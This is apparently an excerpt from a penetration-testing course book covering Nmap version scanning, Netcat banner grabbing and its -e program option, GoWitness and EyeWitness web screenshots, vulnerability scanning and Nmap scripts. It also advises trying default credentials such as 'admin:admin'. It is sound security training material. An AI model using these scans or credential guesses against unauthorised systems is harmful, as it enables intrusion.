# Scanning and Initial Access

# **Version Scanning**

- When Nmap identifies an open port, it displays the default service commonly associated with that port
  - − Based on nmap-services file
  - − But what about other services?
- And what about services on non-standard ports?
  - − Example: Web server on TCP 90 or sshd on TCP 3322
- And what service and protocol version is the target listening service using? Nmap version scanning has the answer.

When you have a list of open ports, you have to determine which services are actually using those ports. One easy (and automatic) way to do this is to merely look up the common service associated with the port. These mappings of port numbers to services are available in several locations. Most UNIX and Linux systems include a /etc/services file that includes rudimentary information of this form. More ports and detailed information are available in the nmap-services file. This file contains approximately 6,400 common services and the well-known ports that they use. Nmap automatically checks this one by default as it displays its output. The official port assignment list maintained by the Internet Assigned Numbers Authority (IANA) can also be consulted at https://www.iana.org/assignments/service-names-portnumbers/service-names-port-numbers.xhtml.

However, while searching such common lists may be valuable, it is limited. The well-known service may not be on that well-known port. For example, what service is listening on a strange port, not included in any of these lists? Furthermore, what if an admin configures a common service on an unusual port, configuring a web server to listen on TCP port 90 or an sshd on TCP 3322? Even if a common service is using a common port, it could be helpful for us to know what version of the service is running and the protocol version number that it speaks to.

Each of these questions is addressed by another useful Nmap feature known as version scanning.

# **Nmap Version Scanning Functionality**

- Version scan invoked with –sV
  - − Makes a connection to TCP and listens for six seconds … if the server banner matches version regular expressions: done!
  - − Sends probes to TCP and UDP ports, sending data designed to elicit a response to determine the service type
    - More than 1,000 service fingerprints in the nmap-service-probes file
  - − Attempts TLS handshake over TCP ports and, if successful, probes over TLS connection (HTTPS is HTTP over TLS, stelnet is telnet over TLS)
  - − Issues Null RPC commands to determine if RPC service is in use
- If Nmap can't identify the service, we can sometimes use Netcat

Or use **-A** for OS fingerprinting, version scan, script scan with default scripts, and traceroute (that is, **-A** = **-O** + **-sV** + **-sC** + **--traceroute**).

To invoke Nmap with its version scanning functionality, use the -sV option. Alternatively, Nmap executed with the -A option will conduct OS fingerprinting, version scanning, script scanning, and Nmap's tracerouting. In Nmap's algebra, it appears that -A = -O + -sV + -sC + --traceroute. In other words, running Nmap with the -A option is the same as running it with the -O (OS fingerprinting), -sV (version scan), -sC (run Nmap Scripting Engine scripts in the "default" category), and --traceroute (use Nmap's traceroute feature) options.

The Nmap version scan functionality is executed after Nmap finishes conducting a port scan of the target. For each discovered open port, Nmap will probe the port to try to determine what is listening there. For TCP ports, Nmap connects to the port with a three-way handshake and waits for a response. If a response comes across the connection, Nmap looks up that response in its nmap-service-probe file. If it finds a match, Nmap prints out information about the service. If no strong match is found, Nmap starts probing the port further.

For open TCP and UDP ports, Nmap probes the target by sending a variety of packets defined in the nmap-service-probes file. There are more than 1,000 signatures in this file, which are highly useful in determining various kinds of target services based on their network behavior. Nmap also attempts to conduct an SSL handshake over open TCP ports, and if SSL is supported, it then probes the target port across the SSL connection to get version information. Nmap also sends null Remote Procedure Call (RPC) commands to listening ports to determine whether it has found a port mapper application that will provide more information for dynamic ports used by RPC services on the box or whether it has found a particular RPC-based service.

When invoked with the --version-trace option, Nmap displays each step of its version probe in its output to give its user a feel for how it is attempting to determine the target service in real-time.

#### **Netcat for the Pen Tester**

- Netcat: General-purpose TCP and UDP network tool
  - − Built into many versions of Linux, available for Windows
  - − Nmap includes ncat, which has Netcat features and more (SSL, multiplexing, etc.)
  - − socat has even more features, but it's rare to see it installed on Linux systems
- nc takes Standard Input (STDIN) and sends it across the network
- Receives data from the network and puts it on Standard Output (STDOUT)
- Messages from Netcat itself are put on Standard Error (STDERR)

![](SEC560_Book2_page_8_Figure_10.jpeg)

Netcat is a general-purpose TCP and UDP network widget for Linux/UNIX and Windows, sending data to or from a given TCP or UDP port or listening for data to come in on a given TCP or UDP port. That's really it from a functionality perspective. But with those essential capabilities, we can use Netcat for all kinds of network-related tasks that penetration testers and ethical hackers may face every day. Netcat is available in many forms. The most common form, which we cover in this class, is the one installed by default on many variants of Linux. There is also a great version of Netcat for Windows, which we also cover and use in this class. The Nmap development team reimplemented most of Netcat's features in its tool called ncat, which includes SSL encryption capabilities.

Netcat takes whatever comes in on Standard Input and sends it across the network. Standard Input could be the keyboard, redirection from a file (using **<** to redirect Standard Input, as in nc *options* < *file*), or input piped from another program (using | for piping, as in *program* | nc *options*).

When Netcat receives data from the network, it places it on Standard Output. Standard Output could be the screen, redirected to a file (using > to redirect Standard Output, as in nc *options* > *file*), or sent to another program's Standard Input. To send Netcat's Standard Output to another program's Standard Input, we have two options. First, we could simply pipe it using the | symbol, as in nc *options* | *program*. That would start streaming the output of Netcat immediately to the program, which would be executed right away.

Alternatively, we could use Netcat with the -e *program* option, which tells Netcat to execute a program only after a connection is made (for TCP) or data arrives (for UDP). Also, -e has the effect not only of passing whatever Netcat receives on the network to the Standard Input of the program but also of sending the Standard Output of the program back across the network via Netcat. An important property of Netcat involves its use of Standard Error. Any messages from Netcat associated with what it's doing on the network are sent to Standard Error. Reading and interacting with this form of Netcat commentary is useful, as you will see.

![](SEC560_Book2_page_9_Figure_0.jpeg)

These are the most important command line options for Netcat. Although there are (many) others, knowing these can help you diagnose Netcat's use in about 95% of circumstances. The format is:

#### nc [options] [targetIP] [remote\_port(s)]

The targetIP is simply the other side's IP address or domain name. It is required in client mode, of course (because we have to tell the client where to connect), and is optional in listen mode.

- -n: Don't perform DNS lookups on names of machines on the other side
- -v: Be verbose, printing out messages, such as when a connection occurs, on Standard Error
- -l: Listen mode (The default is client)
- -p: Local port (In listen mode, this is the port listened on. In client mode, this is the source port for all packets sent)
- -e: Program to execute after a connection occurs, connecting Standard In and Standard Out to the program
- -z: Zero-I/O mode (Don't send any data; just emit a packet without a payload)
- -w*N*: Timeout for connects, waits for N seconds. A Netcat client or listener with this option waits for N seconds to make a connection. If the connection doesn't happen in that time, Netcat stops running. If a connection does occur, Netcat sends or retrieves data. Then, after Standard In has been closed for a total of N seconds, Netcat stops running.
- -u: UDP mode (The default is TCP)

![](SEC560_Book2_page_10_Picture_1.jpeg)

#### **Some Netcat Uses: Banner Grabbing**

- Use Netcat to get service info or confirm service version info
- You may need to enter a connection string to elicit a response

```
sec560@560vm:~$ nc -nv 10.130.10.10 22
                             Connection to 10.130.10.10 22 port [tcp/*] succeeded!
                             SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.5
                             ^C
Retrieve banner from SSH 
server
                             sec560@560vm:~$ nc -nv 10.130.10.25 25
                             Connection to 10.130.10.25 25 port [tcp/*] succeeded!
                             220 mail01.hiboxy.com Microsoft ESMTP MAIL Service ready 
                             at Tue, 3 Dec 2024 19:25:39 +0000
Retrieve banner from SMTP 
Server
                             sec560@560vm:~$ nc -nv 10.130.10.10 80
                             Connection to 10.130.10.10 80 port [tcp/*] succeeded!
                             GET / HTTP/1.0 
                             HTTP/1.1 200 OK
                             Server: nginx/1.24.0 (Ubuntu)
                             ...
Retrieve banner from Web 
server; requires extra input to 
get a response
GET / HTTP/1.0<enter>
<enter>
```

Now that we've had a brief discussion of those command flags, let's look at some practical uses of Netcat for penetration testers. You can harvest a connection string presented by services at connection time by simply using a Netcat client to connect to the target service with the following syntax:

#### \$ nc targetIP remote\_port

Some services will present a banner including their service type, version number, and protocol immediately upon connection. Other services require some string to elicit a response with this information. For some services, simply pressing Enter twice will elicit a response. If the target service speaks HTTP, you can get its connection string by typing:

# HEAD / HTTP/1.0 (followed by Enter twice)

In the screenshot on the slide, we used Netcat to connect to 10.130.10.10 on TCP port 22, the port commonly associated with Secure Shell. Upon connection, without any solicitation, the target tells us its version of SSH. We press CTRL-C to make Netcat drop the connection. We next use Netcat to connect to 10.130.10.25 on TCP port 25. The target tells us that it is running the Microsoft mail service (Exchange).

We connected to 10.130.10.10 on TCP port 80. Nothing was immediately displayed, so we entered HEAD / HTTP/1.0, followed by Enter, Enter. The system told us that it was running Nginx along with its version number and underlying operating system type. Although these connection strings can be altered to fool an attacker, they usually tell the truth.

![](SEC560_Book2_page_11_Picture_2.jpeg)

# **Automating Banner Grabbing**

- Netcat can grab a service string from a series of ports on a target
- Specify a port-range as X-Y: Netcat will connect starting at Y and work down to X

```
nc -nvw2 targetIP port-range
```

• In effect, this is a port scanner that harvests banners

```
sec560@560vm:~$ echo "" | nc -nvw2 10.130.10.10 1-60
(UNKNOWN) [10.130.10.10] 23 (telnet) open
SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.5
Invalid SSH identification string.
(UNKNOWN) [10.130.10.10] 22 (ssh) open
SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.5
Invalid SSH identification string.
```

Of course, testing one target machine on one port is helpful, but we might want to automate this over a range of target ports. Netcat supports such functionality, with the remote\_port(s) option taking a range of numbers specified as x-y. This setting makes Netcat try to connect to the ports, starting at port y and then decrementing by 1, going down until it tries to connect to port x. The **-r** flag makes Netcat work through ports in this range randomly but is used only if you want to be just a little stealthier.

We can harvest connection strings from a range of ports using this command:

```
$ echo "" | nc -nvw2 [targetIP] [port-range]
```

This will echo nothing onto Standard Output, piping that through a Netcat client. We echo nothing to force the closure of Standard Input. Remember, the wait option in Netcat (-wN) will wait for N seconds on an open port after there is no information on Standard Input. If we don't do this echo "", our Netcat client will hang on the first open port, waiting forever for Standard Input from the keyboard, so we purposely echo nothing to close off Standard Input. You'll see how this works in a lab shortly. We echo our nothing into a Netcat client (nc), verbosely printing output (-v) so we can see when a connection is made, not resolving names (-n) to keep clutter out of our output, waiting no more than 2 seconds to make a connection or after a connection is made (-w2) of the target IP address on the target range of ports. In the screenshot on the slide, you can see that we directed the scan at 10.130.10.10, finding some interesting listening ports that didn't return data (TCP 80) and some that did (TCP 22, and 21).

![](SEC560_Book2_page_12_Picture_2.jpeg)

#### **Course Roadmap**

Section 1: Miniature Engagement, Recon, and Scanning

Section 2: Scanning and Initial Access

Section 3: Post-Exploitation

Section 4: Domain Privilege Escalation and Lateral Movement

Section 5: Persistence and Evading Controls

Section 6: CTF and Next Steps

![](SEC560_Book2_page_12_Picture_10.jpeg)

- Version Scanning with Nmap and Netcat
- Visual Scanning with GoWitness
- Vulnerability Scanning and Analysis
- Nmap Scripting Engine
- OS Detection Techniques
  - Lab 2.1: Version Scanning, OS Detection, NSE, and GoWitness
- Initial Access
- Password Guessing
  - Lab 2.2: Password Guessing
- Azure Intro
- Entra ID
- Azure Recon
- Azure Password Attacks
  - Lab 2.3: Azure Recon and Password Attacks
- Sniffing and Relaying
- Responder
  - Lab 2.4: Responder
- Exploitation
- Exploit Categories
- Metasploit and Meterpreter
  - Lab 2.5: Metasploit and Meterpreter

![](SEC560_Book2_page_13_Picture_0.jpeg)

![](SEC560_Book2_page_13_Picture_1.jpeg)

# **GoWitness**

GoWitness helps you visually triage systems quickly so you can be more efficient during a time-constrained penetration test

- Web server reconnaissance tool that takes screenshots of web server home pages, captures header info to speed triage and analysis
  - − Available at https://github.com/sensepost/gowitness/
- Written in Go
  - − Accepts input file with URLs (one per line)
  - − Also reads Nmap and Nessus XML files
  - − Can accept CIDR ranges as targets
  - − Runs a server where hosts can be scanned through a form page
- Details about the site, server headers, cookies, and other information are saved in a SQLite database
- Can run at regular intervals as a form of monitoring

GoWitness is a web server reconnaissance tool written in Go that helps you visually triage large numbers of systems quickly during penetration tests by taking screenshots of web server home pages and capturing header information to speed analysis. Available at https://github.com/sensepost/gowitness/, it accepts flexible input formats including text files with URLs (one per line), Nmap and Nessus XML files, and CIDR ranges as targets. The tool runs a server where hosts can be scanned through a form page, and it stores detailed information about sites—including server headers, cookies, and other metadata—in a SQLite database. GoWitness can also run at regular intervals, making it useful as a monitoring solution for tracking changes in web infrastructure over time.

![](SEC560_Book2_page_14_Picture_2.jpeg)

#### **Running a Scan**

```
$ gowitness scan nmap -f /tmp/webservers.xml --write-db -s screenshots 
2025/09/12 19:24:39 INFO result target=http://10.130.10.6:80 status-code=200
2025/09/12 19:24:41 INFO result target=http://10.130.10.5:80 status-code=200
2025/09/12 19:24:44 INFO result target=http://10.130.10.10:80 status-code=200
2025/09/12 19:24:50 INFO result target=http://10.130.10.11:80 status-code=200
2025/09/12 19:25:04 INFO result target=https://10.130.10.25:443 status-code=200
```

**gowitness**: Main command.

**scan**: Instructs GoWitness to run a scan, instead of generating a report.

**nmap**: Tells gowitness to parse Nmap XML output.

- **-f /tmp/webservers.xml**: Input file, the Nmap scan results in XML format.
- **--write-db**: Saves discovered hosts and scan data into gowitness's SQLite database.
- **-s screenshots**: Directory to save captured screenshots of web services.

Scan targets can be specified by CIDR ranges, URLs in a file, Nessus scans, Nmap XML files, or single URLs

In our example, we'll scan a list of servers in an Nmap XML file, write the results to a database, and specify a directory to save the screenshots to.

# \$ **gowitness scan nmap -f /tmp/webservers.xml --write-db -s screenshots**

- **gowitness**: Main command.
- **scan**: Instructs GoWitness to run a scan, instead of generating a report.
- **nmap**: Tells gowitness to parse Nmap XML output.
- **-f /tmp/webservers.xml**: Input file, the Nmap scan results in XML format.
- **--write-db**: Saves discovered hosts and scan data into gowitness's SQLite database.
- **-s screenshots**: Directory to save captured screenshots of web services.

![](SEC560_Book2_page_15_Figure_0.jpeg)

GoWitness can produce a report or run a server to view the results. There is also a dashboard with statistics about the hosts and scan details. The dashboard is more useful with very large scans. Hosts in the report are grouped by these categories. If a report is produced, the screenshots and data are packed into a Zip file.

![](SEC560_Book2_page_16_Picture_0.jpeg)

![](SEC560_Book2_page_16_Picture_1.jpeg)

# **EyeWitness**

EyeWitness was one of the original tools to implement the automated screenshot technique.

- Web server reconnaissance tool from Chris Truncer (@christruncer) takes screenshots of web server home pages, captures header info, and *identifies default credentials*
  - − Available at https://github.com/RedSiege/EyeWitness
- Runs on Linux (Python) and Windows (.NET C#)
  - − Accepts input file with URLs (one per line)
  - − Also reads Nmap and Nessus XML files
- Output report contains screenshot of each home page, identifies high-value targets and default credentials for known devices/services
  - − Also provides HTTP header information
- The interface is not as fancy as GoWitness; however, the default credential feature is extremely helpful

EyeWitness is a web server reconnaissance tool written by Chris Truncer. EyeWitness gathers screenshots of web server home pages and HTTP header information and presents this information in an HTML report. The EyeWitness output identifies high-value targets (Tomcat manager, Splunk, Jenkins, etc.). EyeWitness also identifies targets by classification (network device, printer, camera, etc.).

EyeWitness is available in two formats: Python for Linux systems and a .NET C# assembly for Windows systems. The .NET assembly can also be executed through a Cobalt Strike beacon using the executeassembly command.

Available at https://github.com/RedSiege/EyeWitness

![](SEC560_Book2_page_17_Figure_0.jpeg)

EyeWitness provides an easy way to get a feel for what kinds of web services are available in the target network. While it tries to identify "high value" targets, testers should always review all results.

EyeWitness notes the default credentials for a service if there is an entry in the EyeWitness database. The list of known default credentials is not complete, however. Testers should always research the default credentials for devices and test with them to ensure the client has changed them. Even if default credentials aren't published, testers should try common default credentials such as "admin:admin", "root:root", "manager:manager", etc.

Do a quick search using your favorite search engine, looking for the name of the product and the words "default password". For example, perform the following query:

dell idrac default password

![](SEC560_Book2_page_18_Picture_2.jpeg)

#### **Course Roadmap**

Section 1: Miniature Engagement, Recon, and Scanning

Section 2: Scanning and Initial Access

Section 3: Post-Exploitation

Section 4: Domain Privilege Escalation and Lateral Movement

Section 5: Persistence and Evading Controls

Section 6: CTF and Next Steps

- Version Scanning with Nmap and Netcat
- Visual Scanning with GoWitness
- Vulnerability Scanning and Analysis
- Nmap Scripting Engine
- OS Detection Techniques
  - Lab 2.1: Version Scanning, OS Detection, NSE, and GoWitness
- Initial Access
- Password Guessing
  - Lab 2.2: Password Guessing
- Azure Intro
- Entra ID
- Azure Recon
- Azure Password Attacks
  - Lab 2.3: Azure Recon and Password Attacks
- Sniffing and Relaying
- Responder
  - Lab 2.4: Responder
- Exploitation
- Exploit Categories
- Metasploit and Meterpreter
  - Lab 2.5: Metasploit and Meterpreter

18

![](SEC560_Book2_page_19_Picture_1.jpeg)

# **Methods for Discovering Vulnerabilities**

How can we determine if a system/software is vulnerable?

- Check software version number (least accurate of all methods)
  - − Some Linux distributions patch a flaw (such as RHEL) but keep an older version number even though they have patched the given software, leading to false positives
- Check the protocol version number spoken
- Look at its behavior—somewhat invasive
- Check its configuration—more invasive (how do we get access?)
- Run exploit against it—potentially dangerous but potentially useful
  - − Successful exploit shows the vulnerability is present

Note that a failed exploit does not indicate that the system is secure!

Vulnerability scanning tools can determine whether a target system is vulnerable to attack in several different ways. The primary (but by no means exclusive) methods employed by today's vulnerability scanners for finding security flaws include:

**Checking version numbers:** If the software running on a target machine has a version number that is known to be flawed, we can have a reasonable expectation that the software is indeed vulnerable. There might be compensating controls in place that block exploitation, such as a network or host-based IPS. However, even with compensating controls, most organizations strive to upgrade and patch out-of-date software. Also, keep in mind that some Linux distributions release a patch to fix a vulnerability for a given installed package, but such distributions sometimes still keep an older version number for that software, leading to false positives. To address this situation, penetration testers should research the version number in the context of the operating system type before reporting a flaw discovered solely based on version number. This situation is especially common with Red Hat Enterprise Linux (RHEL).

**Checking protocol versions:** A related method for finding flaws involves checking which protocol versions a given piece of software speaks. Even if we cannot determine the version of the software itself, we might determine that it speaks an older version of a network protocol, possibly indicating that it hasn't been patched or hardened.

**Looking at its behavior:** Even if software doesn't provide us a means for ascertaining its version number, a tester's tools can interact with the software across the network (or, in certain circumstances, locally), measuring whether it exhibits behavior consistent with a vulnerability. These behavior-discoverable vulnerabilities could be due to old software or misconfigurations. Measuring the behavior of target programs could be somewhat invasive because the tester has to interact with the target in various ways.

**Checking its configuration:** With local access to a machine or even with remote access gained via some other mechanism (such as an exploit or password guessing attack), a tester could analyze a system at a

fine-grained level to determine whether the configurations of the programs on the machine exhibit weaknesses. Such tests tend to be even more invasive than the preceding options, as they require the tester to gain access to a target or get a copy of the system configuration from an administrator.

**Running an exploit against the target:** This often most-invasive form of vulnerability discovery involves actually trying to exploit the target, potentially taking over the system. Running an exploit could be dangerous because it could bring down the target service or the entire system. However, running an exploit can be helpful for testers because successful exploitation proves the presence of a vulnerability (false positive reduction). It should be noted that failed exploitation does not mean that the software is safe, however. It's possible that the tester's exploit failed for any number of reasons, but a different attacker might get it working. So, actual exploitation can lower the number of false positives, but it doesn't help us manage false negatives.

We analyze this issue of the safety of exploitation in further detail at the start of our 560.3 class.

It's also important to note that not all vulnerabilities lead to exploitation. Many vulnerabilities don't let an attacker take over a machine at all. Instead, they could be associated with information leakage or other problems. As penetration testers and ethical hackers, we are interested in all kinds of vulnerabilities in a target environment. Our jobs involve reporting on the issues we discover, regardless of whether they can be exploited. Obviously, exploitable vulnerabilities have higher importance than non-exploitable issues, but all discovered flaws should be reported.

![](SEC560_Book2_page_21_Picture_2.jpeg)

#### **Scanner Goals**

- Perform automated tests to identify tens of thousands of vulnerabilities:
  - − Configuration issues
  - − Missing patches and updates
  - − Default credentials
  - − End-of-Life software
- Output:
  - − List of vulnerabilities, including the host and port
  - − Risk rating
  - − Remediations and mitigation methods
- Types:
  - − General Purpose: Wide range of network devices and services (Nessus, InsightVM, Qualys)
  - − Web Application: Wide range of web applications (AppScan, NetSparker)
  - − Application Specific: Application or service specific (SSLScan, OneSixtyOne, WPScan)

A vulnerability scanner is designed to perform many tests (tens of thousands) to identify vulnerabilities in the target systems. The vulnerabilities to identify include configuration issues, missing patches and updates, default credentials, end-of-life software, and many other vulnerabilities.

The output of the vulnerability scanner includes a list of the vulnerabilities and the host/port on which they are identified. Each vulnerability includes a risk rating and ways to fix or mitigate the vulnerability.

Vulnerability scanners are divided into three broad groups: general-purpose, web application, and application-specific scanners.

General-purpose scanners can interact with and identify vulnerabilities in many different services and operating systems. They can identify issues in FTP servers as well as missing OS patches.

Web application scanners look for vulnerabilities in web applications and APIs. They speak HTTP/HTTPS, can identify data inputs, and will attempt to inject data that can lead to security issues (XSS, SQL injection, command injection, etc.). Some scanners can speak HTTP 1.0 and 1.1, while some can use 2.0. While this type of scanner is technically an application-specific scanner, web applications are such a significant focus that this type of scanner is generally separated into its own group.

Application scanners typically identify vulnerabilities in one specific application or service. For example, SSLScan identifies insecurities in TLS/SSL but not the underlying website (or other service).

Penetration testers often use general-purpose scanners to quickly identify vulnerabilities across the network. To dig into a specific issue or application, or to secondarily confirm a vulnerability, a pen tester may use an application-specific scanner.

![](SEC560_Book2_page_22_Picture_1.jpeg)

# **Scan Types**

- Unauthenticated Most common for pen testers
  - − Access the target over the network
  - − Scanner does not have credentials to access the target
  - − Unable to identify issues in client software without listening services (e.g., Office suite, PDF readers, web browsers)
- Authenticated Less common for pen testers
  - − Access the target over the network
  - − Scanner can access the target
  - − Interrogate the operating system and applications for their configuration
  - − Able to identify vulnerabilities in non-network accessible software
- Agent-based Rare for pen testers
  - − Agent is deployed on the target system
  - − Same as authenticated scanners, but the agent reports issues back to a central system

There are three major types of scans: unauthenticated, authenticated, and agent-based.

Unauthenticated scans are performed by a scanner where the scanner does not have credentials for the target system. This means that the scanner can only identify vulnerabilities in services that are remotely accessible. The scanner cannot identify vulnerabilities in client-side software, such as office tools, PDF viewers, and browsers, since the scanner has no way to access this software. Additionally, the scanner can't find vulnerabilities in functionality that requires authentication.

Authenticated scans allow the scanner to find vulnerabilities in client-side software. In addition, the scanner can ask the host for its configuration—allowing the scanner to find deeper misconfigurations. Likewise, the scanner can interrogate the target and determine missing patches, even if the patch is backported (the patch is applied, but the software version doesn't change).

Agent-based scans are similar to authenticated scans in that the scan can find deeper issues. The key difference is the architecture. In this case, the agent runs the checks and then reports the results back to the central server.

For penetration testers, an unauthenticated scan is most common (if vulnerability scanning is done at all). Sometimes, but much less often, the penetration tester will be given credentials for scanning, or the target will provide scan results from an authenticated scan. While a penetration tester may get results from an agent-based scan, they won't be allowed to deploy their own agent to perform a scan.

![](SEC560_Book2_page_23_Picture_2.jpeg)

# **Safe Checks and Dangerous Plugins**

- Some plugins crash or negatively impact targets
- These plugins are designated as Denial of Service, Dangerous, or similar and are disabled by default
  - − Check with the target (Rules of Engagement) before you use these plugins!
- Penetration testers will rarely run these checks
  - − Internal vulnerability management teams are more likely to be authorized to run these checks
- Attackers would happily use dangerous checks (or attacks) if it benefited them. Would you like to know about and verify these issues?

#### **TIP**

Before you enable dangerous plugins, obtain documented permission from an authorized agent in the target organization. Also, remember that no test or scan is 100% safe!

The various scanners have characterized some of the plugins as dangerous as they could crash or negatively impact a target. The scanners will disable these dangerous plugins and require an administrator to enable the checks. The scanner will still identify potential denial of service vulnerabilities if it can do so safely, such as by checking the version number. With these dangerous plugins disabled, it will not send packets to the system that have been shown to negatively impact target systems. Of course, even "safe checks" could impair or crash the target system or service.

Most testers do not bother asking the target as the answer will invariably decline the more aggressive checks. As discussed earlier, the question of unsafe or dangerous checks is part of the pre-engagement questionnaire.

Tip: Get documented permission before you use dangerous plugins in your scan.

#### **Scan Results**

Results are a guide; adjust risk and recommendations as needed.

- Description of each discovered flaw
  - − Reduce false positives with manual verification
- Estimate of risk level (severity)
  - − Rating does not account for compensating controls
  - − Scanner does not know the system's/data's importance
  - − Scanners don't help with prioritization (you can!)
- Recommendations for resolution
  - − Provide clearer instructions
  - − Provide multiple options (long-term and short-term)
  - − Provide solutions specific to the target
- While understanding vulnerability scanner output and tweaking scans is important, it is not the focus of this course (SEC460 covers this topic in depth)

![](SEC560_Book2_page_24_Picture_15.jpeg)

Scan results include an estimated risk associated with each issue. These results should be used as a guide and should not be copy/pasted into your report. You should adjust the results based on your experience and the potential impact on/to the target system/service.

Scanner output includes the description of the flaw. When you write the report, you will often find it more efficient (for both you and the report recipient) to group findings together. For example, you may have one finding for end-of-life operating systems where you combine scanner findings for Windows 2000 and Fedora 9. Also, as mentioned earlier in this course, make sure you verify findings before adding them to the report.

Vulnerability scanners will often find issues that do not actually exist (false positives). Provide valueadded services by verifying the scanner results manually if possible, researching each discovered issue and trying to see if the given target machine actually exhibits that problem or if we've got a false positive. You may need to review the configuration of the target with the system administrator, research other tools, or craft custom tools.

Scanners will also include an estimated risk rating, commonly categorized as Critical, High, Medium, Low, and Informational severity. This rating does not factor in compensating controls, nor does the scanner understand the importance (or irrelevance) of the target system. The same vulnerability on two different systems may have different risk ratings. You should also help the target prioritize or rank the vulnerabilities. Even though the scanner says that a given issue is High risk, for a given target in a given environment, it may be Medium or Low risk. Of course, the opposite could also apply.

Another key piece of scanner output is the recommendations and mitigations. The list provided by the scanner can be a good starting point, but it is not the end of the story. You should offer the target multiple ways to resolve the issue, even offering short-term and long-term fixes. When it makes sense, add recommendations that are specific to the target, such as recommendations of ways to modify their specific defensive tools to remediate the issue.

While it is important to understand how to use a vulnerability scanner and digest its output, it is not the focus of this course. If you want to dive more deeply into vulnerability management, the process, and the configuration of vulnerability scanners, SANS offers an entire six-section course on the subject, SEC460: Enterprise and Cloud | Threat and Vulnerability Assessment. The course covers the entire vulnerability management process with sections on vulnerability scanner placement, configuration, and results interpretation.

![](SEC560_Book2_page_26_Picture_2.jpeg)

# **Nmap Version Scan as Vulnerability Scanner?**

- Couldn't Nmap's version scanning be used to find vulnerabilities?
  - − Nmap's version scan is usually quite good at getting the version number, then correlates with known issues in the software
  - − Watch out for false positives!
- Nmap version scanning is limited
  - − It sends a packet and scans the response for strings
  - − No meaningful communications with multiple back-and-forth messages
- However, the Nmap Scripting Engine can
  - − This is not a replacement for a professional vulnerability scanner, but it is still quite useful for penetration testers

As we have seen, Nmap supports version checking, which sends probe packets to given ports and matches specific strings in the response to determine the version of a service. With that functionality, couldn't we use that tool to find vulnerable systems? We certainly could by researching the versions of the detected services on the target machines to see if they have a history of flaws. Currently, such research must be done manually by the user of the tool. Nmap does not tell you that the given target is vulnerable; it merely gives you information about the service version, which you must look up.

It's important to note that while the version scan outputs can give you insight into whether the target is vulnerable, Nmap version scanning is limited. It sends a probe and scrapes through its response, looking for certain text. It doesn't have meaningful, complex back-and-forth interactions with targets to measure more complicated behaviors to determine if the given service is vulnerable. Thus, Nmap version scanning may not properly discover subtle vulnerabilities. It might look like a given service is vulnerable based on its version number. However, it's possible that other compensating controls prevent the issue from being exploited. Simple version checking cannot look for those compensating controls. A more complex backand-forth interaction is required to measure whether the target has the behavior of a vulnerable service, not just its version.

However, outside of its version scanning functionality, Nmap has been extended to include a powerful feature to allow it to have complex interactions with targets using scripts to measure for vulnerabilities. This feature is called the Nmap Scripting Engine (NSE).

![](SEC560_Book2_page_27_Picture_2.jpeg)

#### **Course Roadmap**

Section 1: Miniature Engagement, Recon, and Scanning

Section 2: Scanning and Initial Access

Section 3: Post-Exploitation

Section 4: Domain Privilege Escalation and Lateral Movement

Section 5: Persistence and Evading Controls

Section 6: CTF and Next Steps

- Version Scanning with Nmap and Netcat
- Visual Scanning with GoWitness
- Vulnerability Scanning and Analysis
- Nmap Scripting Engine
- OS Detection Techniques
  - Lab 2.1: Version Scanning, OS Detection, NSE, and GoWitness
- Initial Access
- Password Guessing
  - Lab 2.2: Password Guessing
- Azure Intro
- Entra ID
- Azure Recon
- Azure Password Attacks
  - Lab 2.3: Azure Recon and Password Attacks
- Sniffing and Relaying
- Responder
  - Lab 2.4: Responder
- Exploitation
- Exploit Categories
- Metasploit and Meterpreter
  - Lab 2.5: Metasploit and Meterpreter

![](SEC560_Book2_page_28_Picture_2.jpeg)

# **Nmap Scripting Engine**

- Goals of the Nmap Scripting Engine (NSE):
  - − Allow for arbitrary messages to be sent or received by Nmap to multiple targets, running scripts in parallel
  - − Be easily extendable with community-developed scripts
  - − Support extended network discovery (Whois, DNS, and such)
  - − Perform more sophisticated version detection
  - − Conduct vulnerability scanning
  - − Detect infected or backdoored systems
  - − Exploit discovered vulnerabilities
- Extremely useful for scanning for and measuring a relatively small number of specific items across a large number of target systems

The Nmap Scripting Engine has numerous goals that extend the capabilities of Nmap beyond mere port scanning and OS fingerprinting. These goals include:

Utilize Nmap's efficient multithreaded architecture to send arbitrary messages and receive responses in parallel to and from multiple targets.

Create an environment so that a development community can write and release free scripts that can easily be incorporated into scans by all Nmap users.

Support network discovery options that augment Nmap's port scanning and OS fingerprinting features, including Whois lookups, DNS interrogation, and so on.

Enhance version detection functionality beyond "probe and match" to look more deeply into the interaction with a target.

Perform vulnerability scanning of target systems to find configuration flaws and other issues.

Detect systems that have been infected with malware or backdoors based on their network behavior.

Support the exploitation of given flaws to gain access to a target machine or its information, not supplanting the Metasploit exploitation framework but offering some subset of exploit functionality integrated into Nmap.

# **Nmap Scripting Engine Scripts**

- Written in the Lua programming language
- Run all scripts in the "default" category

```
$ sudo nmap -sC target -p ports
```

• Run an individual script, all scripts, category, all in a directory

```
$ sudo nmap --script=[script,all,category,dir…] target -p ports
```

- Use **--script-help** to get a description of each script's functionality (often limited usefulness)
- Add **--script-args** arguments to pass arguments to a script

Nmap scripts are written in the Lua scripting language, which is commonly used in computer games. Lua is widely regarded as a flexible and extremely fast scripting environment. Its interpreter is free, crossplatform, and has a small footprint, making it ideal for incorporation into other applications, such as Nmap. Lua is named after the Portuguese word for "moon" and is described in detail at www.lua.org. The Snort network-based Intrusion Detection System (IDS) and Wireshark sniffer also offer Lua support.

A user would invoke the Nmap Scripting Engine either with the **-sC** option (to run all scripts in the 'default' category) or with the --script= *option* to choose specific scripts. When running specific scripts, a user could choose all (to run all scripts), script categories (which we'll describe shortly), a directory containing several scripts, or individual scripts by name. Alternatively, these different methods can be combined in a comma-separated list.

To get details about the function of each script as well as potential arguments that can be passed to the script, you can add --script-help to your command-line invocation.

For those scripts that support arguments, you can send the arguments by adding --script-args *arguments* to your command line invocation.

![](SEC560_Book2_page_30_Picture_2.jpeg)

# **NSE Script Categories**

- **Auth:** Test authentication
- **Broadcast:** Look for target hosts via broadcasting
- **Brute:** Brute force auth attempts
- **Discovery:** Info gathering
- **Dos:** May cause denial of service
- **Exploit:** Exploit a vulnerability
- **External:** Send information to third party for lookup

- **Fuzzer:** Send unexpected data
- **Intrusive:** May leave logs, guess passwords, or otherwise impact the target
- **Malware:** Detect malware or backdoor
- **Safe:** Not designed to crash target
- **Version:** Detect service version
